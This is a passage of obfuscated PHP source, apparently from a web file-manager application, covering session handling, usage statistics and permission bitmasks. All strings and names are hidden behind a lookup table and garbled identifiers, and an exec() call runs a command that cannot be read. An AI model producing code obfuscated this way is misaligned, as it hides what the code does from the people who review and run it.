call_user_func_array(self::$callbacks[$¢¬ƒŠÌª], $Á›¦ôÕÄ); if (self::$halts) { return; } } } } $¢¬ƒŠÌª++; } } if ($òÒ¥îÂ• == !1) { if (!self::$errorCallback) { self::$errorCallback = function () { $Ú¦Ä°¶ô =& $_SERVER[ú÷îèÆÜ]; header($_SERVER[$Ú¦Ä°¶ô[1634]] . $Ú¦Ä°¶ô[1635]); echo $Ú¦Ä°¶ô[1636]; }; } else { if (is_string(self::$errorCallback)) { self::get($_SERVER[$çˆŞôñŞ[1629]], self::$errorCallback); self::$errorCallback = null; self::dispatch(); return; } } call_user_func(self::$errorCallback); } } } class Session { public static $sessionTime; public static $sessionSign; public static $handle; public static $data; public static function init() { $Âªï©Óƒ =& $_SERVER[ú÷îèÆÜ]; static $ÍÃˆ›ù¶ = false; if ($ÍÃˆ›ù¶) { return $ÍÃˆ›ù¶; } $í¼»ÙŠÏ = $GLOBALS[$Âªï©Óƒ[16]][$Âªï©Óƒ[402]]; self::$sessionTime = $í¼»ÙŠÏ[$Âªï©Óƒ[1637]]; $¯–éš… = isset($GLOBALS[$Âªï©Óƒ[1638]]) ? $GLOBALS[$Âªï©Óƒ[1638]] : SESSION_ID; if (self::$sessionSign) { } else { if (Cookie::get($¯–éš…)) { self::$sessionSign = Cookie::get($¯–éš…); } else { self::$sessionSign = self::$sessionSign ? self::$sessionSign : guid(); } } Cookie::setSafe($¯–éš…, self::$sessionSign, self::$sessionTime); $¹Æá¤à = $í¼»ÙŠÏ[$Âªï©Óƒ[1639]]; $·ì•»±˜ = $í¼»ÙŠÏ[$¹Æá¤à]; $ü©ŠƒÁğ = $í¼»ÙŠÏ[$Âªï©Óƒ[868]]; switch ($¹Æá¤à) { case $Âªï©Óƒ[31]: self::$handle = Model($Âªï©Óƒ[869]); break; case $Âªï©Óƒ[870]: self::$handle = new CacheRedis($·ì•»±˜, $ü©ŠƒÁğ); break; case $Âªï©Óƒ[871]: self::$handle = new CacheMemcached($·ì•»±˜, $ü©ŠƒÁğ); break; case $Âªï©Óƒ[224]: $·ì•»±˜[$Âªï©Óƒ[94]] = $·ì•»±˜[$Âªï©Óƒ[94]] . $Âªï©Óƒ[1640]; self::$handle = new CacheFile($·ì•»±˜, $ü©ŠƒÁğ); default: break; } if (!self::$data) { self::$data = self::getBySign(self::$sessionSign); } $ÍÃˆ›ù¶ = new self(); return $ÍÃˆ›ù¶; } public static function getBySign($ô–°ö¿) { $¨Ş„²ùğ = self::$handle->get($ô–°ö¿); $¨Ş„²ùğ = unserialize($¨Ş„²ùğ); return is_array($¨Ş„²ùğ) ? $¨Ş„²ùğ : array(); } public static function setBySign($ÊÄƒ²ğò, $Ğ¨‹šƒ) { CacheLock::lock($ÊÄƒ²ğò); self::$handle->set($ÊÄƒ²ğò, serialize($Ğ¨‹šƒ), self::$sessionTime); CacheLock::unlock($ÊÄƒ²ğò); } public static function sign($óËŸ¦™ = false) { if ($óËŸ¦™) { self::$sessionSign = $óËŸ¦™; } self::init(); return self::$sessionSign; } public static function set($”ÓÃæüÁ, $Şá†îï‹ = false) { self::init(); if (is_array($”ÓÃæüÁ)) { foreach ($”ÓÃæüÁ as $Ï·ÏüÈ => $†ã¯Ã‹) { array_set_value(self::$data, $Ï·ÏüÈ, $†ã¯Ã‹); } } else { array_set_value(self::$data, $”ÓÃæüÁ, $Şá†îï‹); } self::setBySign(self::$sessionSign, self::$data); } public static function get($ˆò²ß»ğ = false) { self::init(); if (!$ˆò²ß»ğ) { return self::$data; } return array_get_value(self::$data, $ˆò²ß»ğ); } public static function remove($‰¥Ó„ı‘) { self::init(); unset(self::$data[$‰¥Ó„ı‘]); self::$handle->set(self::$sessionSign, serialize(self::$data), self::$sessionTime); } public static function destory() { Cookie::remove(SESSION_ID, !0); self::init(); self::clearTimeout(); self::$data = array(); return self::$handle->remove(self::$sessionSign); } public static function clearTimeout() { self::init(); if (method_exists(self::$handle, $_SERVER[ú÷îèÆÜ][874])) { self::$handle->clearTimeout(); } } } goto dÇĞ¾ïº¥; d¢†ãñËÄå: class AnalysisModel extends ModelBaseLight { public function init($½ÅÓ»ú) { $¢¨øîæ« =& $_SERVER[ú÷îèÆÜ]; $ÑØÚÖÈº = array($¢¨øîæ«[639] => array($¢¨øîæ«[43] => $¢¨øîæ«[1812], $¢¨øîæ«[326] => array($¢¨øîæ«[249], $¢¨øîæ«[805], $¢¨øîæ«[1813], $¢¨øîæ«[1814])), $¢¨øîæ«[1815] => array($¢¨øîæ«[43] => $¢¨øîæ«[1816], $¢¨øîæ«[326] => array($¢¨øîæ«[249], $¢¨øîæ«[803], $¢¨øîæ«[1817], $¢¨øîæ«[1818], $¢¨øîæ«[1819]))); if (!isset($ÑØÚÖÈº[$½ÅÓ»ú])) { return !1; } $this->optionType = $ÑØÚÖÈº[$½ÅÓ»ú][$¢¨øîæ«[43]]; $this->field = $ÑØÚÖÈº[$½ÅÓ»ú][$¢¨øîæ«[326]]; return !0; } public function listData($çíÇš÷ = false, $­ğ´¥Øû = "\155\157\x64\151\146\171\124\151\x6d\145", $õŞ·ù— = false) { return parent::listData($çíÇš÷, $­ğ´¥Øû, $õŞ·ù—); } public function trendList($Á¬óÑÌˆ) { $Ë•ß¨¹Š =& $_SERVER[ú÷îèÆÜ]; $ìÚŒ—ŞÖ = $this->listData(); if ($ìÚŒ—ŞÖ) { $ —œ£×ã = end($ìÚŒ—ŞÖ); $¾äÔ³ë = date($Ë•ß¨¹Š[1820], strtotime($Ë•ß¨¹Š[1821])); if ($ —œ£×ã[$Ë•ß¨¹Š[249]] == $¾äÔ³ë) { return $ìÚŒ—ŞÖ; } $­¯Å¢È¸ = strtotime($ —œ£×ã[$Ë•ß¨¹Š[249]]); } if (!isset($­¯Å¢È¸)) { $Óğæ¹×å = $Á¬óÑÌˆ == $Ë•ß¨¹Š[639] ? $Ë•ß¨¹Š[576] : $Ë•ß¨¹Š[865]; $­¯Å¢È¸ = Model($Óğæ¹×å)->min($Ë•ß¨¹Š[225]); } $ğÙÆ„† = $Ë•ß¨¹Š[1822] . ucfirst($Á¬óÑÌˆ); $ü¶‡Ê‡­ = $this->dateList($­¯Å¢È¸); foreach ($ü¶‡Ê‡­ as $¾äÔ³ë) { $this->{$ğÙÆ„†}($¾äÔ³ë); } return $this->listData(); } private function dateList($‚¾êˆ¦ü) { $¹“ƒ¸—Ğ =& $_SERVER[ú÷îèÆÜ]; $‘‡¾êö¾ = $‚¾êˆ¦ü; $çÇ˜´× = strtotime($¹“ƒ¸—Ğ[1821]); $âæÓİğ = array(); while ($‘‡¾êö¾ <= $çÇ˜´×) { $âæÓİğ[] = date($¹“ƒ¸—Ğ[1820], $‘‡¾êö¾); $‘‡¾êö¾ = strtotime($¹“ƒ¸—Ğ[1823], $‘‡¾êö¾); } return $âæÓİğ; } public function _recordUser($õƒüˆ• = '') { $Ô¸˜³óÔ =& $_SERVER[ú÷îèÆÜ]; $ö´µôŞñ = strtotime(date($Ô¸˜³óÔ[1824], strtotime($õƒüˆ•))); $Ø¾îÔ¸× = strtotime(date($Ô¸˜³óÔ[1825], strtotime($õƒüˆ•))); $±ÃÍâ”½ = array($Ô¸˜³óÔ[225] => array($Ô¸˜³óÔ[1054], $Ø¾îÔ¸×)); $Ø÷ıŸ‚ñ = Model($Ô¸˜³óÔ[576])->where($±ÃÍâ”½)->count($Ô¸˜³óÔ[1685]); $±ÃÍâ”½[$Ô¸˜³óÔ[225]] = array($Ô¸˜³óÔ[386], array($ö´µôŞñ, $Ø¾îÔ¸×)); $¬¿ÃÊ” = Model($Ô¸˜³óÔ[576])->where($±ÃÍâ”½)->count($Ô¸˜³óÔ[1685]); $±ÃÍâ”½[$Ô¸˜³óÔ[43]] = $Ô¸˜³óÔ[1826]; $Œ£•ø©­ = Model($Ô¸˜³óÔ[1827])->where($±ÃÍâ”½)->count($Ô¸˜³óÔ[1828]); $‰ÄâÒ¼í = array($Ô¸˜³óÔ[249] => $õƒüˆ•, $Ô¸˜³óÔ[805] => (int) $Ø÷ıŸ‚ñ, $Ô¸˜³óÔ[1813] => (int) $¬¿ÃÊ”, $Ô¸˜³óÔ[1814] => (int) $Œ£•ø©­); return $this->insert($‰ÄâÒ¼í); } public function _recordStore($’ë¼Á‡ = '') { $ÁÑ»€¢ =& $_SERVER[ú÷îèÆÜ]; $°…ù£ = strtotime(date($ÁÑ»€¢[1825], strtotime($’ë¼Á‡))); $Œ©¯ù¨Ô = array($ÁÑ»€¢[225] => array($ÁÑ»€¢[1054], $°…ù£)); $Ñ±È­ìô = Model($ÁÑ»€¢[521])->where($Œ©¯ù¨Ô)->sum($ÁÑ»€¢[86]); $Œ©¯ù¨Ô[$ÁÑ»€¢[462]] = 0; $ùĞéßĞ‡ = Model($ÁÑ»€¢[865])->where($Œ©¯ù¨Ô)->sum($ÁÑ»€¢[86]); $Œ©¯ù¨Ô[$ÁÑ»€¢[188]] = 1; $ªá¡”º = Model($ÁÑ»€¢[865])->where($Œ©¯ù¨Ô)->sum($ÁÑ»€¢[86]); $Œ©¯ù¨Ô[$ÁÑ»€¢[188]] = 2; $¨Äúö¯µ = Model($ÁÑ»€¢[865])->where($Œ©¯ù¨Ô)->sum($ÁÑ»€¢[86]); $…†ïÉÒœ = array($ÁÑ»€¢[249] => $’ë¼Á‡, $ÁÑ»€¢[803] => (int) $ùĞéßĞ‡, $ÁÑ»€¢[1817] => (int) $Ñ±È­ìô, $ÁÑ»€¢[1818] => (int) $ªá¡”º, $ÁÑ»€¢[1819] => (int) $¨Äúö¯µ); return $this->insert($…†ïÉÒœ); } public function trend($°‚ïÙ­, $‚º—ºëÜ) { $Ë²ëÆ =& $_SERVER[ú÷îèÆÜ]; if (!$this->init($°‚ïÙ­)) { return !1; } $ˆõ²—” = $this->trendList($°‚ïÙ­); if ($ˆõ²—” && $‚º—ºëÜ != $Ë²ëÆ[1658]) { $­ÀÅÙ­® = $ˆõ²—”[0][$Ë²ëÆ[249]]; $³ãÂİÎ = $this->validDate($‚º—ºëÜ, $­ÀÅÙ­®); $®Ã¹º˜¼ = array(); $²Õ™µ¨¡ = array_to_keyvalue($ˆõ²—”, $Ë²ëÆ[249]); foreach ($³ãÂİÎ as $ÄÌ¯ôşş) { if (isset($²Õ™µ¨¡[$ÄÌ¯ôşş])) { $¯Å“ Í = $²Õ™µ¨¡[$ÄÌ¯ôşş]; } else { $¯Å“ Í = end($ˆõ²—”); $¯Å“ Í[$Ë²ëÆ[249]] = $ÄÌ¯ôşş; if ($°‚ïÙ­ == $Ë²ëÆ[639]) { $¯Å“ Í[$Ë²ëÆ[1813]] = $¯Å“ Í[$Ë²ëÆ[1814]] = 0; } } $®Ã¹º˜¼[] = $¯Å“ Í; } $ˆõ²—” = $®Ã¹º˜¼; } $Ç‹ÎÆŸŠ = array($Ë²ëÆ[639] => array($Ë²ëÆ[805] => LNG($Ë²ëÆ[1829]), $Ë²ëÆ[1813] => LNG($Ë²ëÆ[1830]), $Ë²ëÆ[1814] => LNG($Ë²ëÆ[1831])), $Ë²ëÆ[1815] => array($Ë²ëÆ[803] => LNG($Ë²ëÆ[1832]), $Ë²ëÆ[1817] => LNG($Ë²ëÆ[1833]), $Ë²ëÆ[1818] => LNG($Ë²ëÆ[1834]), $Ë²ëÆ[1819] => LNG($Ë²ëÆ[1835]))); $›Û„‡œÙ = array($Ë²ëÆ[639] => $Ë²ëÆ[1836], $Ë²ëÆ[1815] => $Ë²ëÆ[86]); if (empty($ˆõ²—”)) { $ÄÌ¯ôşş = date($Ë²ëÆ[1820], strtotime($Ë²ëÆ[1821])); $øÃ¿Öµ = array($Ë²ëÆ[249] => $ÄÌ¯ôşş); foreach ($Ç‹ÎÆŸŠ[$°‚ïÙ­] as $„€é¡„£ => $¢–‹û‰) { $øÃ¿Öµ[$„€é¡„£] = 0; } $ˆõ²—”[] = $øÃ¿Öµ; } $—”à”Õ“ = array(); foreach ($ˆõ²—” as $¢–‹û‰) { if ($°‚ïÙ­ == $Ë²ëÆ[1815] && $¢–‹û‰[$Ë²ëÆ[1817]] > $¢–‹û‰[$Ë²ëÆ[803]]) { $¢–‹û‰[$Ë²ëÆ[1817]] = $¢–‹û‰[$Ë²ëÆ[803]]; } foreach ($Ç‹ÎÆŸŠ[$°‚ïÙ­] as $„€é¡„£ => $å¢øäñÂ) { $¯Å“ Í = array($Ë²ëÆ[249] => $¢–‹û‰[$Ë²ëÆ[249]], $Ë²ëÆ[1582] => $å¢øäñÂ); $¯Å“ Í[$›Û„‡œÙ[$°‚ïÙ­]] = isset($¢–‹û‰[$„€é¡„£]) ? $¢–‹û‰[$„€é¡„£] : 0; $—”à”Õ“[] = $¯Å“ Í; } } return $—”à”Õ“; } public function validDate($èÄÑØ‹ş, $Ç§öÌ‘‚) { $èáÄ¶­Î =& $_SERVER[ú÷îèÆÜ]; $™»İ„Ò¦ = date($èáÄ¶­Î[1820], strtotime($èáÄ¶­Î[1821])); $ÊˆÊê¨ = array($™»İ„Ò¦); switch ($èÄÑØ‹ş) { case $èáÄ¶­Î[1665]: $˜÷‚è¢† = mktime(0, 0, 0, date($èáÄ¶­Î[1837]), date($èáÄ¶­Î[1401]) - date($èáÄ¶­Î[1464]) + 7 - 7, date($èáÄ¶­Î[1838])); $¤î³—ß = 0; do { $Ø©ôšš‹ = date($èáÄ¶­Î[1820], $˜÷‚è¢† - 3600 * 24 * 7 * $¤î³—ß); $ÊˆÊê¨[] = $Ø©ôšš‹; $¤î³—ß++; } while ($Ç§öÌ‘‚ < $Ø©ôšš‹); break; case $èáÄ¶­Î[1663]: $¤î³—ß = 1; do { $õÕéæäØ = date($èáÄ¶­Î[1839], strtotime("\x2d\x20{$¤î³—ß}\40\155\x6f\156\x74\x68\163")); $ÊˆÊê¨[] = $õÕéæäØ; $¤î³—ß++; } while ($Ç§öÌ‘‚ < $õÕéæäØ); break; case $èáÄ¶­Î[1840]: $™¬‘‘å· = (int) date($èáÄ¶­Î[1838], strtotime($Ç§öÌ‘‚)); $ø¯«¶Æù = (int) date($èáÄ¶­Î[1838]); if ($™¬‘‘å· >= $ø¯«¶Æù) { break; } for ($™¬‘‘å·; $™¬‘‘å· < $ø¯«¶Æù; $™¬‘‘å·++) { $ÊˆÊê¨[] = $™¬‘‘å· . $èáÄ¶­Î[1841]; } break; default: break; } if ($Ç§öÌ‘‚ > end($ÊˆÊê¨)) { array_pop($ÊˆÊê¨); } sort($ÊˆÊê¨); return $ÊˆÊê¨; } public function listTable($ÀÜêşçó) { $×‚Õšî‹ = ucfirst($ÀÜêşçó); return Model($×‚Õšî‹)->listData(); } public function option($ÏÉ¸Üú’) { $™ÙØ•…¥ = $_SERVER[ú÷îèÆÜ][1842] . ucfirst($ÏÉ¸Üú’); return $this->{$™ÙØ•…¥}(); } private function optionUser() { $•©´ÚÏ¢ =& $_SERVER[ú÷îèÆÜ]; $ßœÜû€µ = Model($•©´ÚÏ¢[576])->count($•©´ÚÏ¢[1685]); $’îÁœü· = Model($•©´ÚÏ¢[576])->where($•©´ÚÏ¢[1843])->count($•©´ÚÏ¢[1685]); $®«Ïı¸· = intval($GLOBALS[$•©´ÚÏ¢[16]][$•©´ÚÏ¢[402]][$•©´ÚÏ¢[1637]]) / 3600; $æ»»·ãÑ = strtotime("\x2d{$®«Ïı¸·}\40\x68\157\x75\162\163"); $«é¾ù‡¥ = strtotime(date($•©´ÚÏ¢[1824])); if ($æ»»·ãÑ < $«é¾ù‡¥) { $æ»»·ãÑ = $«é¾ù‡¥; } $˜ê†º¯ = array($•©´ÚÏ¢[1844] => array($•©´ÚÏ¢[1055], $æ»»·ãÑ)); $×£ˆÚˆ‹ = (int) Model($•©´ÚÏ¢[576])->where($˜ê†º¯)->count($•©´ÚÏ¢[1685]); if (!$×£ˆÚˆ‹) { $×£ˆÚˆ‹ = 1; } $˜ê†º¯ = array($•©´ÚÏ¢[1844] => array($•©´ÚÏ¢[1055], $«é¾ù‡¥)); $şÊşùá² = Model($•©´ÚÏ¢[576])->where($˜ê†º¯)->count($•©´ÚÏ¢[1685]); return array($•©´ÚÏ¢[798] => (int) $ßœÜû€µ, $•©´ÚÏ¢[1845] => (int) ($ßœÜû€µ - $’îÁœü·), $•©´ÚÏ¢[1846] => (int) $’îÁœü·, $•©´ÚÏ¢[1847] => (int) $şÊşùá², $•©´ÚÏ¢[1848] => $×£ˆÚˆ‹); } private function optionFile() { $™Ê¶‰ûÊ =& $_SERVER[ú÷îèÆÜ]; $á’‚ ° = $this->sourceSize(); $ƒıÎ¦‘õ = $á’‚ °[$™Ê¶‰ûÊ[86]]; $ôªÒÎÓ° = $á’‚ °[$™Ê¶‰ûÊ[1817]]; $½» áÒ = Model($™Ê¶‰ûÊ[865])->where(array($™Ê¶‰ûÊ[462] => 0))->count($™Ê¶‰ûÊ[191]); $¬ªÅû‘” = array($™Ê¶‰ûÊ[462] => 0, $™Ê¶‰ûÊ[225] => array($™Ê¶‰ûÊ[1055], strtotime(date($™Ê¶‰ûÊ[1824])))); $ã”Öé„« = Model($™Ê¶‰ûÊ[865])->where($¬ªÅû‘”)->sum($™Ê¶‰ûÊ[86]); $Â¾òˆ¶ƒ = Model($™Ê¶‰ûÊ[865])->where($¬ªÅû‘”)->count($™Ê¶‰ûÊ[191]); return array($™Ê¶‰ûÊ[803] => $ƒıÎ¦‘õ, $™Ê¶‰ûÊ[1817] => $ôªÒÎÓ°, $™Ê¶‰ûÊ[1849] => $ƒıÎ¦‘õ - $ôªÒÎÓ°, $™Ê¶‰ûÊ[1850] => (int) $ã”Öé„«, $™Ê¶‰ûÊ[805] => (int) $½» áÒ, $™Ê¶‰ûÊ[1851] => (int) $Â¾òˆ¶ƒ); } private function optionAccess() { $ÛÑÇ–·£ =& $_SERVER[ú÷îèÆÜ]; return array($ÛÑÇ–·£[798] => $this->typeLogCnt(), $ÛÑÇ–·£[117] => $this->typeLogCnt($ÛÑÇ–·£[117]), $ÛÑÇ–·£[502] => $this->typeLogCnt($ÛÑÇ–·£[502]), $ÛÑÇ–·£[1852] => $this->typeLogCnt($ÛÑÇ–·£[1852]), $ÛÑÇ–·£[1853] => $this->typeLogCnt($ÛÑÇ–·£[1853]), $ÛÑÇ–·£[639] => $this->typeLogCnt($ÛÑÇ–·£[22], $ÛÑÇ–·£[1828])); } private function typeLogCnt($Åñ†ÆŞÚ = '', $€™ùÙÄ = "\x69\144") { $åŠâïŸ¡ =& $_SERVER[ú÷îèÆÜ]; $¹ÏÎãµ = array($åŠâïŸ¡[117] => array($åŠâïŸ¡[1854], $åŠâïŸ¡[1855]), $åŠâïŸ¡[502] => array($åŠâïŸ¡[1856], $åŠâïŸ¡[1857]), $åŠâïŸ¡[1852] => array($åŠâïŸ¡[1858], $åŠâïŸ¡[1859], $åŠâïŸ¡[1860]), $åŠâïŸ¡[1853] => array($åŠâïŸ¡[1861], $åŠâïŸ¡[1862]), $åŠâïŸ¡[1863] => array($åŠâïŸ¡[1864], $åŠâïŸ¡[1865], $åŠâïŸ¡[1866])); $“ÖËí‘é = strtotime(date($åŠâïŸ¡[1824])); $Â¡©ªøš = array($åŠâïŸ¡[225] => array($åŠâïŸ¡[1055], $“ÖËí‘é)); if ($Åñ†ÆŞÚ) { $Â¡©ªøš[$åŠâïŸ¡[43]] = array($åŠâïŸ¡[17], $¹ÏÎãµ[$Åñ†ÆŞÚ]); } $¼èò„Àå = Model($åŠâïŸ¡[1827])->where($Â¡©ªøš)->count($€™ùÙÄ); return (int) $¼èò„Àå; } private function optionServer() { $Ñ»÷‚ö£ =& $_SERVER[ú÷îèÆÜ]; $×¶É¿„¢ = $this->diskDriver(); $ã™ä¯™ä = KodIO::defaultDriver(); $ìªã–Æé = array($Ñ»÷‚ö£[857] => $ã™ä¯™ä[$Ñ»÷‚ö£[452]]); $åßó²Ò® = Model($Ñ»÷‚ö£[521])->where($ìªã–Æé)->sum($Ñ»÷‚ö£[86]); $«‹—í = explode($Ñ»÷‚ö£[63], $_SERVER[$Ñ»÷‚ö£[154]]); $ÃãÜŸŞù = $«‹—í[0]; $ÚÈÉ¦’Ì = $GLOBALS[$Ñ»÷‚ö£[16]][$Ñ»÷‚ö£[31]]; $“ñõÙò¿ = $ÚÈÉ¦’Ì[$Ñ»÷‚ö£[1017]]; if ($“ñõÙò¿ == $Ñ»÷‚ö£[1005]) { $İ¹®®™ë = explode($Ñ»÷‚ö£[1323], $ÚÈÉ¦’Ì[$Ñ»÷‚ö£[1016]]); $“ñõÙò¿ = $İ¹®®™ë[0]; } if ($“ñõÙò¿ == $Ñ»÷‚ö£[953] || $“ñõÙò¿ == $Ñ»÷‚ö£[844]) { $Î’ì°¶Æ = Model()->db()->query($Ñ»÷‚ö£[1867]); $Ã‹Ô©šç = $Î’ì°¶Æ[0] && isset($Î’ì°¶Æ[0][$Ñ»÷‚ö£[1581]]) ? $Î’ì°¶Æ[0][$Ñ»÷‚ö£[1581]] : 0; $“ñõÙò¿ = $Ñ»÷‚ö£[1868] . ($Ã‹Ô©šç ? $Ñ»÷‚ö£[18] . $Ã‹Ô©šç : $Ñ»÷‚ö£[22]); } $Â£›˜İ = $GLOBALS[$Ñ»÷‚ö£[16]][$Ñ»÷‚ö£[402]][$Ñ»÷‚ö£[867]]; return array($Ñ»÷‚ö£[1869] => $×¶É¿„¢ ? $×¶É¿„¢[$Ñ»÷‚ö£[1870]] : 0, $Ñ»÷‚ö£[1871] => $×¶É¿„¢ ? $×¶É¿„¢[$Ñ»÷‚ö£[1872]] : 0, $Ñ»÷‚ö£[1873] => (int) $ã™ä¯™ä[$Ñ»÷‚ö£[1870]] * 1024 * 1024 * 1024, $Ñ»÷‚ö£[1874] => (int) $åßó²Ò®, $Ñ»÷‚ö£[1875] => ucfirst($ÃãÜŸŞù), $Ñ»÷‚ö£[1876] => $Ñ»÷‚ö£[1877] . PHP_VERSION, $Ñ»÷‚ö£[1878] => phpBuild64() ? 64 : 32, $Ñ»÷‚ö£[797] => str_replace($Ñ»÷‚ö£[1171], $Ñ»÷‚ö£[1033], $“ñõÙò¿), $Ñ»÷‚ö£[402] => ucfirst($Â£›˜İ), $Ñ»÷‚ö£[42] => $_SERVER[$Ñ»÷‚ö£[1879]]); } private function diskDriver() { $«Ì¼ªßÚ =& $_SERVER[ú÷îèÆÜ]; $Ã’¸–‹ò = $«Ì¼ªßÚ[18]; $Úä‘¬îı = $GLOBALS[$«Ì¼ªßÚ[16]][$«Ì¼ªßÚ[1340]] == $«Ì¼ªßÚ[1341]; if ($Úä‘¬îı) { $Ã’¸–‹ò = $«Ì¼ªßÚ[1880]; if (function_exists($«Ì¼ªßÚ[1881])) { exec($«Ì¼ªßÚ[1882], $û³¡‘™Ş); $Ã’¸–‹ò = $û³¡‘™Ş[1] . $«Ì¼ªßÚ[18]; } } if (!file_exists($Ã’¸–‹ò)) { return; } $©Úˆ‘“¦ = @disk_total_space($Ã’¸–‹ò); $î¶‘ØŞü = $©Úˆ‘“¦ - @disk_free_space($Ã’¸–‹ò); return array($«Ì¼ªßÚ[1870] => $©Úˆ‘“¦, $«Ì¼ªßÚ[1872] => $î¶‘ØŞü); } public function fileChart($Â¬ÓàûÌ) { $²¥şìÇ =& $_SERVER[ú÷îèÆÜ]; if (isset($Â¬ÓàûÌ[$²¥şìÇ[1685]])) { return Model($²¥şìÇ[865])->userFileTypeProfile($Â¬ÓàûÌ[$²¥şìÇ[1685]]); } if (isset($Â¬ÓàûÌ[$²¥şìÇ[1883]])) { return Model($²¥şìÇ[865])->groupFileTypeProfile($Â¬ÓàûÌ[$²¥şìÇ[1883]]); } $±×ø«¦€ = $this->sourceSize(); $åŸ½Ë»Œ = array($²¥şìÇ[190] => 0, $²¥şìÇ[188] => 1); $ŸÆ•¡³’ = Model($²¥şìÇ[865])->where($åŸ½Ë»Œ)->sum($²¥şìÇ[86]); $åŸ½Ë»Œ[$²¥şìÇ[188]] = 2; $‘ìŞ¯»§ = Model($²¥şìÇ[865])->where($åŸ½Ë»Œ)->sum($²¥şìÇ[86]); return array($²¥şìÇ[803] => $±×ø«¦€[$²¥şìÇ[86]], $²¥şìÇ[1817] => $±×ø«¦€[$²¥şìÇ[1817]], $²¥şìÇ[1818] => (int) $ŸÆ•¡³’, $²¥şìÇ[1819] => (int) $‘ìŞ¯»§); } private function sourceSize() { $±ıÖÁªß =& $_SERVER[ú÷îèÆÜ]; $„Ê½ñ¼Á = Model($±ıÖÁªß[865])->where(array($±ıÖÁªß[462] => 0))->sum($±ıÖÁªß[86]); $‘ÄõÁ¸‚ = Model($±ıÖÁªß[521])->sum($±ıÖÁªß[86]); if ($‘ÄõÁ¸‚ > $„Ê½ñ¼Á) { $‘ÄõÁ¸‚ = $„Ê½ñ¼Á; } return array($±ıÖÁªß[86] => (int) $„Ê½ñ¼Á, $±ıÖÁªß[1817] => (int) $‘ÄõÁ¸‚); } } class AuthModel extends ModelBaseLight { const AUTH_SHOW = 1; const AUTH_VIEW = 2; const AUTH_DOWNLOAD = 4; const AUTH_UPLOAD = 8; const AUTH_EDIT = 16; const AUTH_REMOVE = 32; const AUTH_SHARE = 64; const AUTH_COMMENT = 128; const AUTH_EVENT = 256; const AUTH_ROOT = 33554432; public static function authAll() { return self::AUTH_SHOW | self::AUTH_VIEW | self::AUTH_DOWNLOAD | self::AUTH_UPLOAD | self::AUTH_EDIT | self::AUTH_REMOVE | self::AUTH_SHARE | self::AUTH_COMMENT | self::AUTH_EVENT | self::AUTH_ROOT; } public static function authDefault() { $ğŸ¨ÖÌ© =& $_SERVER[ú÷îèÆÜ]; $„ûşŞÅÎ = array(array($ğŸ¨ÖÌ©[471] => LNG($ğŸ¨ÖÌ©[1884]), $ğŸ¨ÖÌ©[1885] => $ğŸ¨ÖÌ©[1886], $ğŸ¨ÖÌ©[1887] => 1, $ğŸ¨ÖÌ©[1888] => 1, $ğŸ¨ÖÌ©[1889] => self::AUTH_SHOW | self::AUTH_VIEW | self::AUTH_DOWNLOAD | self::AUTH_UPLOAD | self::AUTH_EDIT | self::AUTH_REMOVE | self::AUTH_SHARE | self::AUTH_COMMENT | self::AUTH_EVENT), array($ğŸ¨ÖÌ©[471] => LNG($ğŸ¨ÖÌ©[1890]), $ğŸ¨ÖÌ©[1885] => $ğŸ¨ÖÌ©[1891], $ğŸ¨ÖÌ©[1887] => 2, $ğŸ¨ÖÌ©[1888] => 1, $ğŸ¨ÖÌ©[1889] => self::AUTH_SHOW | self::AUTH_VIEW | self::AUTH_DOWNLOAD | self::AUTH_UPLOAD | self::AUTH_EDIT | self::AUTH_COMMENT | self::AUTH_EVENT), array($ğŸ¨ÖÌ©[471] => LNG($ğŸ¨ÖÌ©[1892]), $ğŸ¨ÖÌ©[1885] => $ğŸ¨ÖÌ©[1893], $ğŸ¨ÖÌ©[1887] => 3, $ğŸ¨ÖÌ©[1888] => 1, $ğŸ¨ÖÌ©[1889] => self::AUTH_SHOW | self::AUTH_VIEW | self::AUTH_DOWNLOAD | self::AUTH_COMMENT | self::AUTH_EVENT), array($ğŸ¨ÖÌ©[471] => LNG($ğŸ¨ÖÌ©[1894]), $ğŸ¨ÖÌ©[1885] => $ğŸ¨ÖÌ©[1895], $ğŸ¨ÖÌ©[1887] => 4, $ğŸ¨ÖÌ©[1888] => 1, $ğŸ¨ÖÌ©[1889] => self::AUTH_SHOW | self::AUTH_VIEW), array($ğŸ¨ÖÌ©[471] => LNG($ğŸ¨ÖÌ©[1896]), $ğŸ¨ÖÌ©[1885] => $ğŸ¨ÖÌ©[1897], $ğŸ¨ÖÌ©[1887] => 5, $ğŸ¨ÖÌ©[1888] => 1, $ğŸ¨ÖÌ©[1889] => self::AUTH_SHOW | self::AUTH_UPLOAD), array($ğŸ¨ÖÌ©[471] => LNG($ğŸ¨ÖÌ©[1898]), $ğŸ¨ÖÌ©[1885] => $ğŸ¨ÖÌ©[1899], $ğŸ¨ÖÌ©[1887] => 6, $ğŸ¨ÖÌ©[1888] => 1, $ğŸ¨ÖÌ©[1889] => self::AUTH_SHOW | self::AUTH_VIEW | self::AUTH_DOWNLOAD | self::AUTH_UPLOAD | self::AUTH_EDIT | self::AUTH_REMOVE | self::AUTH_SHARE | self::AUTH_COMMENT | self::AUTH_EVENT | self::AUTH_ROOT), array($ğŸ¨ÖÌ©[471] => LNG($ğŸ¨ÖÌ©[1900]), $ğŸ¨ÖÌ©[1885] => $ğŸ¨ÖÌ©[1901], $ğŸ¨ÖÌ©[1887] => 7, $ğŸ¨ÖÌ©[1888] => 1, $ğŸ¨ÖÌ©[1889] => 0)); return $„ûşŞÅÎ; } public static function authCheck($¾º§«°õ, $Ü©ó±è ) { $ÁŠëã“ =& $_SERVER[ú÷îèÆÜ]; $¾º§«°õ = intval($¾º§«°õ); if ($GLOBALS[$ÁŠëã“[545]] && $GLOBALS[$ÁŠëã“[16]][$ÁŠëã“[1902]]) { return !0; } if ($¾º§«°õ <= 0) { return !1; } if (($¾º§«°õ & self::AUTH_ROOT) == self::AUTH_ROOT) { return !0; } return !!($¾º§«°õ & $Ü©ó±è ); } public static function authCheckShow($¿ª¥ëîß) { return self::authCheck($¿ª¥ëîß, self::AUTH_SHOW); } public static function authCheckView($Œ¸æùâ¥) { return self::authCheck($Œ¸æùâ¥, self::AUTH_VIEW); } public static function authCheckDownload($ß”¦—Æõ) { return self::authCheck($ß”¦—Æõ, self::AUTH_DOWNLOAD); } public static function authCheckUpload($«Œß·ãû) { return self::authCheck($«Œß·ãû, self::AUTH_UPLOAD); } public static function authCheckEdit($É˜ëØãé) { return self::authCheck($É˜ëØãé, self::AUTH_EDIT); } public static function authCheckRemove($éÑ·ùé) { return self::authCheck($éÑ·ùé, self::AUTH_REMOVE); } public static function 